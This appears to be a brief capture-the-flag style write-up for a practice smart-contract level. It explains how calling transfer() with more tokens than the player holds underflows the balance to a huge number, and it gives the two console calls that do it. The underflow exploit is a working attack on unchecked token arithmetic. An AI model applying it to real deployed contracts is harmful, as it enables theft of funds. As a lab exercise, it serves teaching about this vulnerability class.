// LEVEL GOALS:
// 1. Hold more than 20 tokens
// -------------------------------
// STRATEGY:
// 1. Odometers tick back to zero once they reach the max num
// 2. Exploit the transfer() function by calling transfer() with
//     more tokens than I have - causing an underflow
// 3. Check the underflow caused my balance to tick back around to a high number
// -------------------------------------------- 
// STEPS TO COMPLETE LEVEL
// -----------------------

// 1 - Call transfer() from my account, sending more tokens than I have
// Here I send 21 when I only have 20. Sending to the deployer instance
// but could be any other address
await contract.transfer(instance, 21, {from: player, gas: 1000000})

// 2 - Check my balance increased to a massive number
await contract.balanceOf(player)
// it did :)
